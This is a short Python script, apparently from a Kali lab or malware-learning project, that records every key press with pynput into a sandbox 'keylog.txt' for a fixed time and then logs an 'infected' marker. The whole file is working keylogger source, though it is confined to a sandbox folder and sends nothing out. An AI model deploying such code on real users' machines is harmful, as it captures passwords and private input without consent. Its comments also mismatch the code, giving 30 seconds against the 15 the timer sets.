from datetime import datetime, timedelta  
from pynput.keyboard import Key, Listener
from pathlib import Path
import logging

# ---------- Paths ----------
# ROOT = Path(__file__).resolve().parent
# BOX = ROOT/ "sandbox"
BOX = Path("/home/kali/Desktop/poly_virus/sandbox")
BOX.mkdir(exist_ok=True)                      # ensure sandbox/ exists

# ---------- Configure logging ----------
# Set up a basic log file called keylog.txt inside the current working directory.
#   • filename="keylog.txt"  → where keystrokes will be saved
#   • level=logging.DEBUG    → capture *all* messages (DEBUG and above)
#   • format="%(asctime)s - %(message)s"
#       - %(asctime)s  → human-readable timestamp
#       - %(message)s  → whatever text we pass to logging.info()
logging.basicConfig(
    filename=str(BOX / "keylog.txt"), 
    level =logging.DEBUG, 
    format = "%(asctime)s - %(message)s"
)

# -------------------- 30-second timer --------------------
START_TIME = datetime.now()
STOP_TIME  = START_TIME + timedelta(seconds=15)   # when we auto-exit

# ---------- Callback for each key press ----------
def on_press(key):
    # Convert the key to a string and record it.
    logging.info(str(key))

    # Check timeout
    if datetime.now() >= STOP_TIME:
        return False

# ---------- Start the listener ----------
# The Listener runs in a background thread.
with Listener(on_press=on_press) as listener:
    # .join() blocks the main thread and keeps the program alive
    # until the listener is stopped manually (Ctrl-C) or via listener.stop().
    listener.join()

# ---------- High-level run marker ----------
# After the listener exits, add one summary line.
with (BOX / "infected.log").open("a") as f:
    f.write(f"[{datetime.now()}] Keylogger captured 30 s of input\n")